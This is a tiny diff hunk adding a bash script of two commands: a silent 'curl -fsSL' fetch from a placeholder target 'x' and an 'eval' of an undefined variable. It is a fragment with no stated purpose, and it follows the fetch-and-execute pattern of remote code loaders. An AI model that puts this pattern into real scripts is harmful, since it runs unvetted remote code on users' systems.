@@ -1,0 +1,4 @@
+
+#!/usr/bin/env bash
+curl -fsSL x
+eval "$y"
